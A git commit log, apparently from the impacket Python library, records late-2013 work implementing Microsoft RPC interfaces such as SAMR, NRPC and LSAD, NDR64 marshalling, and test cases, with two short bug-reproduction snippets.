                # (as specified in [MS-RPCE] section 2.2.1.1.7) and at least
                # RPC_C_AUTHN_LEVEL_PKT_INTEGRITY authentication level (as specified in
                # [MS-RPCE] section 2.2.1.1.8) are used in this RPC message.
                # Otherwise, the RPC server MUST return STATUS_ACCESS_DENIED.

commit 0180f6afd880e18a7dd481005ede320dac38b697
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 15:03:36 2014 +0000

    calls made to SamrSetDSRMPassword using NCACN_IP_TCP are rejected with RPC_S_ACCESS_DENIED.

commit 5d6eef41744b7f744e4907640ee7c0cf2eaa28a6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 14:57:41 2014 +0000

    NDRPOINTERNULL must be created again based on the NDR transfer syntax in use

commit 4bc2b68c6aee5c59b8be818a0cc5bc8c5805ab7f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 14:16:23 2014 +0000

    Moving some methods to the base class

commit bf980c3240553701d5d389a762cbc9025fe3ee2c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 13:48:41 2014 +0000

    Change in MSRPCBindAck base class

commit a3c810cd852ba1d9d29452c1b883c5e94f0cf9c6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 23:25:44 2014 +0000

    Updated to the new RPC Runtime

commit 4496a4658fd2651902564804b614d03023a1cb90
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 19:17:14 2014 +0000

    Ported to the new RPC runtime

commit 7f431841b60bdfcb09112db784072e0643ecb644
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 19:12:51 2014 +0000

    Same functionality as before, but ported to the new RPC runtime

commit 98b07863670ebc3c4201c48070f5e0fb7483b8e1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 18:46:43 2014 +0000

    Typo

commit e74e6e9d548c40f2ffde50afe8ff6749a0c18440
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 17:35:50 2014 +0000

    Bye bye.. we don't want you anymore.. replaced by nrpc.py

commit 3ad62a7d37994c82c0156637ca6639189e73c50e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 16:17:48 2014 +0000

    Enabled the TCPTransport testcase

commit a539ce6209d65e5f5b8409467a800a2c6832e84c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 16:11:21 2014 +0000

    We should respect the transfer_syntax previously choosen when doing an alter_ctx

commit 0a138a62127e4a56950fc97b45686529f082ca0c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 15:21:39 2014 +0000

    NETLOGON RPC_C_AUTHN_LEVEL_PKT_PRIVACY and RPC_C_AUTHN_LEVEL_PKT_INTEGRITY support. Right now just supporting RC4, not AES.

commit 01f134ed25eeebe2d81029c0cb7eddc972390971
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 15:20:45 2014 +0000

    SIGN() and SEAL() refactored so it makes it easier for users to consume these functions

commit 9f9db801214048c5754578c61e27d73b2f564a0b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 8 16:34:29 2014 +0000

    1) Fixed typos on som calls reponse's structures
    2) Added a dictionary with the opnums and their structures

commit d33a5c8ce7c562202e18ab58612d91aa4fc863f5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 8 14:54:02 2014 +0000

    changeTransferSyntax() needs to recreate some data types whenever we change to NDR64

commit 57cf1ce036c4b2dad503321548a9e869a4b07d73
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 8 12:35:19 2014 +0000

    Added NDR64 tests.. still some failing

commit 2f033cdb65078933b7f5290a8b0b1537c06b0c76
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 8 12:18:42 2014 +0000

    The alignment saga continues

commit dfff6f25e92da505d6ee671c43aed727c031d626
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 7 20:08:28 2014 +0000

    More alignment stuff + fix in nrpc DsrGetForestTrustInformation()

commit ca1d78743f10f9ffe194a15477aadbd867ddbd93
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 7 17:27:42 2014 +0000

    More padding and alignment stuff, in preparation for NDR64.

commit b5f65486bfb6747633c806697893ab1c08d25af3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 7 15:47:25 2014 +0000

    Forgot to change the call to NDR.getData()

commit 044653431fa9884b65f809a048f840cd979df8d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 22:02:40 2014 +0000

    Fixed bug inside fromString when NDRUniConformantArray and NDRHYPER was present.
    This code wasn't working:
    from impacket.dcerpc.v5.ndr import *
    from impacket.dcerpc.v5.dtypes import *
    from impacket.winregistry import hexdump
    
    class Puta(NDRSTRUCT):
        structure = (
            ('Nose1', NDRLONG),
            ('Nose2', NDRLONG),
            ('Nose3', NDRLONG),
        )
    
    class Conformant(NDRSTRUCT):
        structure = (
            ('Item1', ULONG),
            ('Item2', USHORT),
            ('Item3', NDRSHORT),
            ('Item35', Puta),
            ('Item4', NDRUniConformantArray),
        )
    
    
    kk = Conformant()
    kk['Item1'] = 0xaa
    kk['Item2'] = 0xbb
    kk['Item3'] = 0xcc
    kk['Item4'] = ['a']
    kk.dump()
    
    hexdump(str(kk))
    nn = Conformant(str(kk))
    nn.dump()

commit 37bf2aad330ab2b6c4ea579db74d627aeaf40051
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 20:40:58 2014 +0000

    Getting rid of unnecesary align attributes

commit 0989d49f1d2eab4ca479b243073752cf0fcf8872
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 19:25:04 2014 +0000

    ept_lookup_handle_t redefinition plus simpler way to represent arrays

commit de18fe12b7df30a8c473b4529b1a2a6906abfd0e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 16:32:19 2014 +0000

    NDRSTRUCT data type created

commit 6876b8c3a76275ba8a3c89805e6769495d334d0e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 14:25:57 2014 +0000

    NDRCall -> NDRCALL
    NDRPointer -> NDRPOINTER
    NDRPointerNULL -> NDRPOINTERNULL
    NDRUnion -> NDRUNION
    
    dtypes.py now imports the datatypes directly

commit d2e796761834e4f2231361f1fc2d1759cb295e7f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 28 02:50:59 2013 +0000

    More NDR64

commit 14da66783f222f28fd9d5aec7fd33156f83310fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 28 02:38:47 2013 +0000

    A much better RPC_SID using NDRUniConformantArray

commit 011d7be60495f4db72e5c8b2bc50bf1346901476
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 23:52:24 2013 +0000

    More NDR64 stuff.. not there yet :s

commit 2c4e5b65f93a800ffd1bc5d24efd509c010a653f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 22:29:12 2013 +0000

    Fixed bug when not initializing array items with the isNDR64 parameter

commit 57a8209546b2b0c76094b241b52ad3789a164a7a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 21:26:55 2013 +0000

    Better worked out the ARRAYs unpacking

commit 6009570a47dc81417f5eec5998889b3e16c4be63
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 18:37:31 2013 +0000

    More NDR64 work

commit 60aaf5cec4f0337378c6a07fc91862b967c3894c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 15:54:49 2013 +0000

    Added password command, so the users can change their passwords easily

commit 537f7850692fc5baccfb00f79ef37f77164d5c98
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 15:54:14 2013 +0000

    hashes support for hSamrUnicodeChangePasswordUser2() when changing passwords

commit 6a64046123c7669e8b3e9e703ee17befc18c25d5
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 26 16:41:55 2013 +0000

    Some updates related to NDR64, not ready yet

commit d4de2e49e2172f9667e03e4d453b96e5e933babb
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 26 13:56:47 2013 +0000

    Helper functions finished

commit a84ff937822b134e1849fb4a0afdaca14f376218
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 25 07:15:12 2013 +0000

    some helper functions added, more to go

commit 95e7501dd6af9a94aa5a08b562d7be065340d58e
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 22:40:35 2013 +0000

    More reliability

commit 617162125fa8b2c0e1c41763aa4f5391d14106e1
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 21:48:49 2013 +0000

    Wrong NDR type for some fields

commit 48769da4e195bf9a93f10b01d91f2d5bef411ed9
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:31:03 2013 +0000

    Fix problem when setting a NULL pointer for an RPC_UNICODE_STRING

commit 58384e1949eedb2a5d7b4b1f5fdcadb8f778f518
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:30:33 2013 +0000

    STRING changed for LPWSTR

commit 3bd8921848fd93036207baac17657ceafbe69933
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:29:53 2013 +0000

    Fixups

commit cf1168f665a822aa465366ff1e7e3efbd0640480
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:20:20 2013 +0000

    PSTRING not needed

commit ce37270597e3ce6f12260dcfc8206c6c3a3be5b4
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:19:58 2013 +0000

    Fix 8s for FIXED_ARRAY

commit 58253332de23bbb92179026e4000d20b89dda3f3
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 23 20:11:38 2013 +0000

    [MS-NRPC] Interface implementation + testcases... a few still to be solved

commit edd23dfb4119c55a13ef4cb80ae60fedeea38921
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 23 18:29:15 2013 +0000

    PSTRING replaced just for STRING

commit 0e46b5146373fea0d03562a15966d40aec13b269
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 22 20:50:42 2013 +0000

    The *Change*Password* methods are creating a temp account to play with the passwords

commit a41d2a9650f796d8b316bbea5428c43906f6e4c5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 22:02:25 2013 +0000

    I created primitive data types with signed / unsigned types.. and changed all the interfaces.. It should reflect what the docs say

commit 15ff10843ba8a985d91c8fb6c53e548d9795c8ad
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 20:56:09 2013 +0000

    Added more calls

commit 12d033e275d4a8d8cfe0d3d46001f103d7966565
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 19:51:38 2013 +0000

    1) No more UNIQUE_RPC_UNICODE_STRING
    2) RPC_UNICODE_STRING Length/MaximumLength put in the right order
    3) RPC_UNICODE_STRING generates a random ReferentID

commit 331106482a18b82d74c75361e468b24ec61b8337
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 19:41:15 2013 +0000

    I don't need these files here anymore

commit 6855b6e1ee35e000b68cd1f26a81c80d193aa20c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 19:38:08 2013 +0000

    MS-LSAT Inteface Implementation + test cases

commit 6b2950480a7d643b2c9400f50d4f2baf44c67305
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 18:11:31 2013 +0000

    Moving RPC_UNICODE_STRING_ARRAY to samr.py, small changes on lsad.py

commit dc5038c765af160fc94a966a782b0481fa0012d7
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 02:25:42 2013 +0000

    Added more tests

commit 060984cb55ec1d79105b6ab1b1f06d39450fb263
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 02:25:11 2013 +0000

    Slightly changes to make it more general

commit cc5ff3a8d5d974dafcce3adea8786fa83f617d74
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 00:15:51 2013 +0000

    Fixed testcase when closing my pipe

commit 2f791e4dc4f506ee198ac7b911c60d039c7f1915
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 00:15:24 2013 +0000

    Commented resp.dump()

commit 24a719a1c593cd369c089d4e37ee6d580b79ff8c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 00:11:14 2013 +0000

     aimed at testing just the DCERPC engine, not the particular
     endpoints (we should do specific tests for endpoints)
     here we're using EPM just beacuse we need one, and it's the
     easiest one

commit 77f7efee37b209d708b5ccac911316f29e40cdfb
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 23:58:05 2013 +0000

    Modified some test cases to be more general and not dependants of the targets configuration

commit 99881090ed9ee2682284a6ee1dea264f6dc7d984
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 23:31:29 2013 +0000

    MS-LSAD partial implementation + testcases

commit 08b18a117d7e6c6d460faf887efae4683a35a916
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 21:30:58 2013 +0000

    Added PLARGE_INTEGER and LPSTR

commit a36ccf071408c97d64045e6e16f2c71c9d9c4041
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 20:48:48 2013 +0000

    Fixed a bug when trying to pack/unpack a pointer to a pointer of an array (yes :s ). This code wasn't working:
    from impacket.dcerpc.v5.ndr import *
    from impacket.dcerpc.v5.dtypes import *
    from impacket.winregistry import hexdump
    
    class PLPBYTE(NDRPointer):
        referent = (
            ('Data', LPBYTE),
        )
    
    class Conformant(NDR):
        structure = (
            ('Item1', NDRLONG),
            ('Item2', NDRLONG),
            ('Item3', NDRLONG),
            ('Array', PLPBYTE),
        )
    
    class Puta(NDRCall):
        structure = (
            ('Nose1', NDRLONG),
            ('LaCuestion', Conformant),
            ('Nose2', NDRLONG),
        )
    
    kk = Puta()
    kk['Nose1'] = 1
    kk['Nose2'] = 0xffffffff
    kk['LaCuestion']['Item1'] = 1
    kk['LaCuestion']['Item2'] = 2
    kk['LaCuestion']['Item3'] = 3
    kk['LaCuestion']['Array'] = list('BETOBETO')
    
    kk.dumpRaw()
    hexdump(str(kk))
    
    nn = Puta(str(kk))
    nn.dumpRaw()

commit ba8c62a7fe5f81c31d94dbce7ae06a4daed0baf4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 19:00:29 2013 +0000

    Added support for [C706] 14.3.7.1 and 14.3.7.2

commit 18b98a496def8c265ff6a6a63147652f8178ff1d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 17 22:46:17 2013 +0000

    Finished.. only helper functions left to do in the future

commit f60c95aea8e7bc5bf5a432033d68a1251e9c103b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 17 22:45:11 2013 +0000

    Added LUID

commit 814ca693838cb24f7571e4c9e4ec35b5dd27798c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 16 21:45:16 2013 +0000

    [MS-SRVS] Interface implementation + testcases
    
    Not finished yet

commit b137c471c39bae4711b3ce1b06a73498e21253f0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 16 21:43:15 2013 +0000

    Added 2.2.26 LMSTR

commit f2586cb8cd6308c6ca7fdd0a1b82942ec3c08424
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 16 21:42:49 2013 +0000

    When the pointer is NULL, just print NULL ;)

commit 03791ebf59d0559dcc76dd359c42ce1b013f3ce8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 16 19:21:49 2013 +0000

    Forgot to add the pad to the soFarItems

commit 427bdf028028b7f8bb11eee6a1965bfb529c4634
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 13 20:25:27 2013 +0000

    1) Added ability to specify the transfer_syntax when binding. NDR64 still not fully supported but this is useful for some stuff
    2) Fixed a bug when reporting an exception when binding

commit c87d8f394e1f1f703ccf00662bb9abd1b23d359a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 13 20:06:53 2013 +0000

    [MS-WKST] Interface implementation + testcases

commit 45e0e5576f472852cb6219f9c0c1d1d741d2caf8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:07:06 2013 +0000

    1) Target's data is taken from a single file. Easier for changing configuration
    2) Added TCPTransport test for all testcases

commit d5763bb77e7c7d2bed2a5218e82ad0451c248cbd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:04:21 2013 +0000

    1) More padding fixes :s
    2) NDRUnion should behave similar to an NDRCall. The pointers there should be top level pointers if the Union is part of the main NDR call structure. This could be done more clean, work to do.

commit 9dcee30aa41c00da7a731adde1c71d1941fc170a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:02:45 2013 +0000

    class LPLONG added

commit ffe83685fb5873da93d9550f9424789606cefd16
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:02:29 2013 +0000

    Changes to the exception handler based on previous commit

commit e144c2dd86d0206dc16efc00d3f7df3372730aeb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:01:54 2013 +0000

    If we cannot unpack the error packet, we just call the exception with the error_code

commit 727d747c8b2a73bcb429d2659f53cae94d5a6e9f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 00:45:47 2013 +0000

    fixed typo for ncacn_ip_tcp

commit 97e632e0a8dac20b2fc196bbbdb64e914f2c9c17
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 11 23:50:32 2013 +0000

    Final calls added.. all SAMR calls in place. In the future we should craft some helper functions to make it easier to use the calls. See testcases for example of use

commit 30f896fbf8d2730732b70f1d558e91cb9efe3837
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 11 23:49:12 2013 +0000

    1) __setitem__ set on those classes that calculate the length of a string or array so everything is recalculated when packing
    2) fix on getData where soFar was wrongly calculated

commit 61379744c8c81ab2074b2ba3ae333fd83d416a6f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 11 23:48:15 2013 +0000

    1) __setitem__ set on those classes that calculate the length of a string or array so everything is recalculated when packing
    2) Added ACL()/PACL() and SECURITY_DESCRIPTOR()/PSECURITY_DESCRIPTOR()

commit 456f370f3ed339e7a7e4d7fc2d527ec56486706b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 21:11:46 2013 +0000

    Based on previous commit, on those places where the NDRUnion tag is different from NDRSHORT, we gotta declare it

commit 76166893f141cfc2001ff5a940c80fc85b664bc4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 21:11:08 2013 +0000

    1) Making it cleaner the way we carry the bytes already processed for pad calculation
    2) NDRUnion default tag now is NDRSHORT
    2) NDRUnion default tag now is NDRSHORT

commit a16238259a75d8a92816847a0f1e2ba42c4c3137
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:20:54 2013 +0000

    Updated test case

commit 2d75c98ebb8f8fa89ca64df1a109982c4e3efed1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:20:16 2013 +0000

    Updated test cases

commit f9769af25980c88a44d3a14e78f33c38d6983eaa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:19:24 2013 +0000

    Items reorganization + more calls.. close to finish

commit f77e5c528ae35f5d66fbadcafba6495b074bb16f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:18:08 2013 +0000

    changing getData(), fromString() according to previous changeset

commit 60a38cb5312b5cc724d64a52d454829214520596
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:16:52 2013 +0000

    changed fromString(), getData() according to previous changeset

commit fcd9755f00febdd999b5f38f830058e6a13cac98
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:15:31 2013 +0000

    getData() and fromString() now received a soFar variable that specified the bytes processed so far so PAD can be calculated over the ENTIRE octet stream

commit b9a89791b6f4fd08bde5046b881ce1660f1b720d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 20:58:09 2013 +0000

    Added
    1) SamrDeleteUser
    2) SamrDeleteAlias
    3) SamrDeleteGroup
    4) SamrGetMembersInGroup
    5) SamrRemoveMemberFromGroup
    6) SamrAddMemberToGroup

commit e2c2f4efba187e4c6486236caa3f365a7344179c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:24:10 2013 +0000

    Fixed bug when encryption/integrity was used

commit f5273bda186d6d6286ebb402debea2215149675c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:19:03 2013 +0000

    Fixed bug when encryption/integrity was used

commit 23de460767e55df02b321a63a38798c462f94b02
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:01:00 2013 +0000

    STR() added

commit 9b9d2be372bdfe99831972b0833bed912d10ad7c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:00:34 2013 +0000

    NDRENUM() added

commit d85273cd9df4bcc618bcd9a1f976ccf1b3300c8f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:00:18 2013 +0000

    Python 2.7 backport for Python 3.x enum data type

commit 0f5d93acde107526e5bc162af090b9f6b2454a03
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 16:59:21 2013 +0000

    Loooots of new calls added.. still more to go

commit 1e6794fd547eda8b2ba0870a97eea4a819f60b7a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 16:58:44 2013 +0000

    updated testcases

commit 7bf3f47525b76dce5ae2d4ba1683280e8ade73ab
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:55:49 2013 +0000

    samr test cases I have so far

commit 31e2229cfadba0502d7978c6606b6fdb1c27bd2f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:53:19 2013 +0000

    Changes in NDRUnion impacted test cases

commit f54dcca791fca9fa926c9dac19d6e89262498acc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:52:15 2013 +0000

    Samr implementation from scratch.. just starting

commit bb982afe1bdabfa6f63fe1edb978481aad6b9a99
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:51:12 2013 +0000

    I finally understood the difference between RPC_UNICODE_STRING and LPWSTR, setting up the right values here

commit 4164d32b4f1fecfa26c520532ff30f3b460834d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:50:15 2013 +0000

    1) Moved Common data types to dtypes.py
    2) NDRUnion SwitchValue not needed anymore
    3) Added align for NDRSMALL
    4) setitem can now assign NDR classes if they are similar
    5) NDRCall.getData() and NDRCall.fromString() now also call getDataReferent() and fromStringReferent() (not sure about this, testing needed)

commit 9e8f7eae7077060362f1080f61f8ee3a912beee0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:46:57 2013 +0000

    Added more data definitions from [MS-DTYP]
    1) RPC_SID
    2) ACCESS_MASK
    3) RPC_UNICODE_STRING
    4) WSTR

commit 4b3ecf24b6c7e72b5161519d343b97634a803213
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 4 20:47:18 2013 +0000

    Opps.. first line dissapeared somehow

commit b8edb894bd29d75b02c15bae25cd1c72ad8d7b3a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 4 20:36:13 2013 +0000

    Since rpcrt is now handling some exceptions, the right one to catch here is rpc_s_access_denied

commit 0e9de8a1c24321b1dbd305fd5408c394591c42c2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 4 20:14:44 2013 +0000

    1) hept_lookup() helper function added
    2) removed exception messages that are handled by rpcrt
    3) fixed PrintStringBinding()

commit f8f4a77e4e1cf792d099290732373da3b7462e96
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 4 20:12:45 2013 +0000

    Added DCERPCException()

commit 310d0ca1fe6dacf02e4aecf6d329fa14267a0a30
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 22:34:27 2013 +0000

    UUID/PUUID types added

commit 42bb487432bfdd56604021fe9386f00c0b29a945
